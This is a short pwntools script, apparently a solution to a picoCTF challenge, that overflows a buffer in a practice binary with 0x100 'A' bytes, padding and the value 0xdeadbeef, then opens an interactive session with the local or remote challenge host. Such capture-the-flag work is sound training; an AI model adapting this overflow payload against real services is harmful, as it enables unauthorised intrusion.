#!/usr/bin/env python3

from pwn import *

exe = ELF("chall")

context.binary = exe

def conn():
    if args.REMOTE:
        return remote("mars.picoctf.net", 31890)
    elif args.DEBUG:
        return gdb.debug([exe.path])
    else:
        return process([exe.path])


def main():
    r = conn()

    payload = b"A"* 0x100
    payload += b"BBBBBBBB"
    payload += p32(0xdeadbeef)

    r.sendline(payload)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

